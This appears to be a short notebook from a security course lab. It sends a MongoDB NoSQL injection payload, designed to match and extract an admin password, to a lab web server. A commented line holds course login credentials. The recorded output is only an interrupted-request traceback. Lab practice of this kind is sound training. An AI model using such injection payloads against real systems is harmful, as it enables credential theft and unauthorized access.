# %%
import requests
#loginpayload = {'login':'wangxin','pwd':'wangxin'}
session = requests.Session()
#resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)
resp = session.get('http://172.16.230.165/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e.*%2F)%2F%2F')
print(resp.text)
# Out:
# ---------------------------------------------------------------------------
# KeyboardInterrupt                         Traceback (most recent call last)
# <ipython-input-3-cfb35ac3fff7> in <module>()
#       3 session = requests.Session()
#       4 #resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)
# ----> 5 resp = session.get('http://172.16.230.165/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e.*%2F)%2F%2F')
#       6 print(resp.text)
#
# /usr/lib/python3/dist-packages/requests/sessions.py in get(self, url, **kwargs)
#     499
#     500         kwargs.setdefault('allow_redirects', True)
# --> 501         return self.request('GET', url, **kwargs)
#     502
#     503     def options(self, url, **kwargs):
#
# /usr/lib/python3/dist-packages/requests/sessions.py in request(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)
#     486         }
# ...

# %%
k = 'mystring'
k.
